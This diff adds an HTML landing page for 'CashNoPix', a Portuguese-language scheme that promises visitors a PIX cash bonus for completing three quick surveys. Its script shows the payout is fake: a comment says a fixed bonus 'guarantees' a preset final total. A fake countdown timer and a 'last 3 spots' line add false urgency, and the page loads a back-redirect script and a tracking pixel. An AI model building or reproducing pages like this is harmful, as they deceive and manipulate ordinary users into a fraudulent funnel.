@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <meta name="theme-color" content="#064e3b">
+  <title>CashNoPix</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link rel="stylesheet" href="style.css">
+<script src="pixel.js"></script>
+</head>
+<body>
+
+<div class="bonus-page">
+
+  <div class="bonus-card">
+    <div class="gift-circle">
+      <svg width="34" height="34" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <polyline points="20 12 20 22 4 22 4 12"/>
+        <rect x="2" y="7" width="20" height="5"/>
+        <line x1="12" y1="22" x2="12" y2="7"/>
+        <path d="M12 7H7.5a2.5 2.5 0 0 1 0-5C11 2 12 7 12 7z"/>
+        <path d="M12 7h4.5a2.5 2.5 0 0 0 0-5C13 2 12 7 12 7z"/>
+      </svg>
+    </div>
+
+    <h1 class="bonus-title">✨ PARABÉNS! ✨</h1>
+    <p class="bonus-subtitle">
+      Você foi selecionado para receber <strong>um bônus exclusivo</strong>!
+    </p>
+
+    <div class="bonus-value-box">
+      <p class="bonus-value-label">Seu bônus inicial:</p>
+      <p class="bonus-value-amount" id="bonusAmt">R$ 0,00</p>
+    </div>
+
+    <p class="bonus-instruction">
+      Complete <strong>3 avaliações rápidas</strong> para liberar seu saque via PIX!
+    </p>
+
+    <button class="btn-green btn-pulse" id="btnResgatar" onclick="resgatar(event)">
+      Resgatar Bônus
+    </button>
+
+    <div class="countdown-line">
+      <span>⏱</span>
+      <span>Oferta expira em <strong id="timerEl">4:59</strong></span>
+    </div>
+    <p class="scarcity-line">🔥 Últimas 3 vagas disponíveis hoje</p>
+  </div>
+</div>
+
+<!-- Particles layer (behind) -->
+<div id="particles" style="position:fixed;inset:0;pointer-events:none;z-index:0;overflow:hidden;"></div>
+
+<script src="sounds.js"></script>
+<script src="backredirect.js"></script>
+<script>
+  // Bônus inicial fixo — garante total de R$467,83 ao final
+  const bonus = 47.26;
+
+  // Count-up animation
+  const amtEl = document.getElementById('bonusAmt');
+  let cur = 0;
+  const target = bonus;
+  const steps = 28;
+  let step = 0;
+  const timer = setInterval(() => {
+    step++;
+    cur = target * (step / steps);
+    amtEl.textContent = 'R$ ' + cur.toFixed(2).replace('.', ',');
+    if (step >= steps) { amtEl.textContent = 'R$ ' + target.toFixed(2).replace('.', ','); clearInterval(timer); }
+  }, 28);
+
+  // State — balance starts as just the initial bonus shown on screen
+  const state = { balance: bonus, round: 0, bonus };
+  localStorage.setItem('cnp', JSON.stringify(state));
+
+  // Countdown
+  let secs = 299;
+  const timerEl = document.getElementById('timerEl');
+  setInterval(() => {
+    if (secs > 0) secs--;
+    timerEl.textContent = Math.floor(secs/60) + ':' + String(secs%60).padStart(2,'0');
+  }, 1000);
+
+  // Floating particles
+  const emojis = ['💰','✨','💵','🤑','💸','⭐','🎉'];
+  const pCont = document.getElementById('particles');
+  function spawnParticle() {
+    const el = document.createElement('div');
+    el.className = 'floating-particle';
+    el.textContent = emojis[Math.floor(Math.random() * emojis.length)];
+    el.style.left = (Math.random() * 100) + 'vw';
+    el.style.animationDuration = (7 + Math.random() * 7) + 's';
+    el.style.fontSize = (14 + Math.random() * 12) + 'px';
+    pCont.appendChild(el);
+    setTimeout(() => el.remove(), 15000);
+  }
+  // Initial burst + ongoing
+  for (let i = 0; i < 6; i++) setTimeout(spawnParticle, i * 300);
+  setInterval(spawnParticle, 1400);
+
+  // Ripple helper
+  function addRipple(e, el) {
+    const r = document.createElement('div');
+    r.className = 'ripple';
+    const rect = el.getBoundingClientRect();
+    const cx = (e.changedTouches ? e.changedTouches[0].clientX : e.clientX) - rect.left - 2;
+    const cy = (e.changedTouches ? e.changedTouches[0].clientY : e.clientY) - rect.top - 2;
+    r.style.left = cx + 'px';
+    r.style.top  = cy + 'px';
+    el.appendChild(r);
+    setTimeout(() => r.remove(), 600);
+  }
+
+  function resgatar(e) {
+    addRipple(e, e.currentTarget);
+    SFX.click();
+    const btn = document.getElementById('btnResgatar');
+    btn.disabled = true;
+    btn.innerHTML = '<span class="spinner"></span>Aguarde...';
+    setTimeout(() => { window.location.href = 'codigo.html'; }, 700);
+  }
+</script>
+</body>
+</html>
